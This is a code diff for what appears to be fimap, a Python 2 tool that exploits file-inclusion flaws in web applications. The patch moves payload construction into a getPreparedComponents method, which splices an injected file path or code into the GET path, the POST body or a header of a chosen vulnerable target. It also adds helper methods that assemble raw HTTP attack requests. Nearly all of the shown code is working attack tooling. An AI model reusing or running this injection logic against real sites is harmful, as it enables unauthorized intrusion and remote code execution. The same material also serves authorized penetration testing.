@@ -26,6 +26,7 @@ import sys
 from baseClass import baseClass
 from config import settings
 import urllib2
+import urlparse
 
 __author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
 __date__ ="$03.09.2009 03:40:49$"
@@ -47,10 +48,55 @@ class codeinjector(baseClass):
     def setReport(self, report):
         self.report = report
 
-    def start(self):
-        domain = self.chooseDomains()
-        vuln   = self.chooseVuln(domain.getAttribute("hostname"))
+    def getPreparedComponents(self, shcode=None):
+        fpath = None
+        postdata = None
+        header_dict = []
+        
+        vuln = self.vulnerability;
+        
+        fpath = vuln.getAttribute("path")
+        param = vuln.getAttribute("param")
+        prefix = vuln.getAttribute("prefix")
+        suffix = vuln.getAttribute("suffix")
+        if (shcode == None):
+            shcode = vuln.getAttribute("file")
+        
+        paramvalue = vuln.getAttribute("paramvalue")
+        postdata = vuln.getAttribute("postdata")
+        ispost = int(vuln.getAttribute("ispost"))
+        
+        isUnix = vuln.getAttribute("os") == "unix"
+        
+        vulnheaderkey           = vuln.getAttribute("header_vuln_key")
+        header_dict_b64         = vuln.getAttribute("header_dict")
+        header_dict = {}
 
+        if (header_dict_b64 != ""):
+            header_dict_pickle      = b64decode(header_dict_b64) 
+            header_dict             = pickle.loads(header_dict_pickle)
+
+        
+        if (not isUnix and shcode[1]==":"):
+            shcode = shcode[3:]
+        
+        payload = "%s%s%s" %(prefix, shcode, suffix)
+        if (ispost == 0):
+            fpath = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+        elif (ispost == 1):
+            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+        elif (ispost == 2):
+            tmp = header_dict[vulnheaderkey]
+            tmp = tmp.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+            header_dict[vulnheaderkey] = tmp
+        
+        return(fpath, postdata, header_dict, payload)
+
+
+    def start(self, OnlyExploitable):
+        domain = self.chooseDomains(OnlyExploitable)
+        vuln   = self.chooseVuln(domain.getAttribute("hostname"))
+        self.vulnerability = vuln;
         hostname = domain.getAttribute("hostname")
         mode = vuln.getAttribute("mode")
         fpath = vuln.getAttribute("path")
@@ -84,15 +130,7 @@ class codeinjector(baseClass):
         plugman = self.config["PLUGINMANAGER"]
         
         if (kernel == ""): kernel = None
-        payload = "%s%s%s" %(prefix, shcode, suffix)
-        if (ispost == 0):
-            fpath = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
-        elif (ispost == 1):
-            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
-        elif (ispost == 2):
-            tmp = header_dict[vulnheaderkey]
-            tmp = tmp.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
-            header_dict[vulnheaderkey] = tmp
+        fpath, postdata, header_dict, payload = self.getPreparedComponents()
         php_inject_works = False
         sys_inject_works = False
         working_shell    = None
@@ -868,3 +906,45 @@ class HaxHelper:
                 break
         f.close()
         return(ret)
+    
+    def getURL(self):
+        return self.url
+    
+    def getHaxDataForCustomFile(self, file):
+        return(self.parent_codeinjector.getPreparedComponents(file))
+    
+    def doRequest(self, URL, POST=None, HEADERS=None):
+        return(self.parent_codeinjector.doPostRequest(URL, POST, additionalHeaders=HEADERS))
+    
+    def getRawHTTPRequest(self, customFile):
+        path, post, header, payload = self.parent_codeinjector.getPreparedComponents(customFile)
+        hasPost = post != None and post != ""
+        host = urlparse.urlsplit(self.url)[1]
+        
+        ret = ""
+        if (not hasPost):
+            ret = "GET %s HTTP/1.1\r\n" %(path)
+        else:
+            ret = "POST %s HTTP/1.1\r\n" %(path)
+        
+        ret += "Host: %s\r\n" %(host)
+        
+        if header.has_key("Cookie"):
+            ret += "Cookie: "
+            for k,v in header["Cookie"]:
+                ret += "%s: %s;" %(k,v)
+            ret += "\r\n"
+        
+        if (hasPost):
+            ret += "Content-Type: application/x-www-form-urlencoded\r\n"
+            ret += "Content-Length: %d\r\n"%(len(post))
+            ret += "\r\n"
+            ret += "%s\r\n" %(post)
+        
+        ret += "\r\n"
+        
+        return(ret)
+        
+    def drawBox(self, header, choises):
+        self.parent_codeinjector.drawBox(header, choises)
+        
